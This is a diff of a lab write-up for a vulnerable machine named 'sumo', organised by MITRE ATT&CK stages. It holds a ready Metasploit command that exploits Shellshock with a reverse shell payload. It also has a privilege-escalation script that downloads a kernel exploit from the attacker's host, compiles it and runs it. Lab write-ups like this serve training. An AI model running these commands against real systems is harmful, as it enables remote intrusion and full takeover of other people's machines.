@@ -13,31 +13,33 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### Techniques and procedures
-- Opened up ZAP and crawled host's port 80 HTTP server; found nothing of note. 
-- Nikto 
-  - found this server was vuln to shellshock
-  - was able to identify a directory /cgi-bin/test, as well as a file test.sh
-    - I wasn'table to figure out a way to identify these files without Nikto, or what method Nikto used to find them, but it may be related to mod_negotiate being in use on the Apache server
-- Gobuster ( #Crawling )
+### Procedure
+#### T1594 - Search Victim owned Websites
+- Used ZAP and crawled host's port 80 HTTP server; found nothing of note.
+- Gobuster
   - Didn't get 200s for pages other than index.html with Seclists Discovery Wordlists
   - After having success with Nikto, wrote a script at  [Reconnaissance](Reconnaissance) which was able to identify this folder, as well as a default "it works! file". 
-  
-  Nothing else was identified. It's clear this is supposed to be considered enough to find the vector.
+
+   
+#### T1595 - Active Scanning 
+- Nikto 
+  - Identified shellshock vulnerability on the target
+  - Also identified a directory /cgi-bin/test, as well as a file test.sh
+    - Didn't determine how to identify these files without Nikto
+    - What method Nikto used to find them, but it may be related to mod_negotiate being in use on the Apache server
+ #### Reconnaissance Summary
+  - Nothing else was identified. Methods to identify the vulnerability appear to be
     1) Nikto
     2) Knowing that CGI is extremely vulnerable
-No other write-ups I've found have illustrated using pure deduction to figure this vector out.
+- No other write-ups I've found have illustrated anything other than Nikto or pure deduction based on the presence of CGI to find this vector.
 
 ## Initial Access, Execution & Command and Control
 --------
-Scanned for shellshock vulnerabilities in MSF (Searchsploit could've been used here as well):
-```
-search shellshock
-```
+### Procedure
+1. Scanned for shellshock vulnerabilities in MSF (Searchsploit could've been used here as well):
+```search shellshock```. The ```apache_mod_cgi_bash_env_exec``` exploit was returned as an applicable MSF module.
+2. Deliver payload via MSF
 
-The ```apache_mod_cgi_bash_env_exec``` exploit was returned as an applicable msf module.
-
-###### Metasploit Resource Script for exploitation
 ```
 msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec;\
 set PAYLOAD payload/linux/x86/shell_reverse_tcp;\
@@ -45,37 +47,32 @@ set TARGETURI /cgi-bin/test/test.cgi;\
 set RHOST 172.16.2.44;\
 set LPORT 4444;\
 set CVE CVE-2014-6278;\
-exploit -z" 
+exploit -z"
 ```
-#MetasploitScripts
 
 
 ## Discovery > Collection > Exfiltration
 --------
-- Checked running processes with ps -aux. Didn't find anything noteworthy. 
-- Home directory was also quite bare. 
-- Checked listening connections which didn't find anything noteworthy. 
-- Checked distro/kernel version and compared it against searchsploit, which turned up an exploit
-- Finally just wrote a script that would execute post_enum for me at [Discovery](Discovery.md)
+### Procedure
+1. Checked running processes with ps -aux. Didn't find anything noteworthy. 
+2. Checked home directory and served Apache directory /var/www/html, finding nothing 
+3. Checked listening connections which didn't find anything noteworthy. 
+4. Checked distro/kernel version and compared it against searchsploit, which turned up an exploit
 
 ## Privilege Escalation
 --------
-Simply looking up the kernel version in SearchSploit uncovered kernel exploit based LPE
-```text 
-searchsploit ubuntu |grep 3.2.0-23 |grep -vi \< 3.2.0-23 
-```
-In the MSF shell, the following code will trigger the exploit
+### Procedure
+1. Identify victim's kernel version as vulnerable to LPE (source: SearchSploit)
+```searchsploit ubuntu |grep 3.2.0-23 |grep -vi \< 3.2.0-23 ```
 
-
-### sumo_post.sh - privilege escalation script
-
-```
-sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh"
-```
+2. Compile as pwn.c and serve via http
+3. Use the ```-s``` flag to run sumo_post.sh script over the ssh session  
+```sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh"```
+### Notes
+**sumo_post.sh**
 ```bash
 #!/bin/bash
-#sumo_post.sh 
-# move to tmp for dirty work
+##### sumo_post.sh - privilege escalation script
 cd /tmp
 R="172.16.2.45"
 wget $R/pwn.c #priv esc exploit
@@ -88,14 +85,13 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 
-
 ## Appendix: 
 ---
 ### Key lessons learned:
 - Looking only for 200s in gobuster caused me to miss CGI-Bin dir. 
 - Not enabling recursion in your automations can make enumeration a pain
-- Large desire to read approaches that didn't use Nikto to discover the mod-cgi vulnerability
--Modify shell path early on to avoid "missing" binaries with ```export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin```
+- No straight lines found to discovering CGI vulnerability outside Nikto or Apache-CGI expertise
+- Modify shell path early on to avoid "missing" binaries with ```export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin```
 ---
 ### Technical Issues Encountered:
 GCC compliation error:
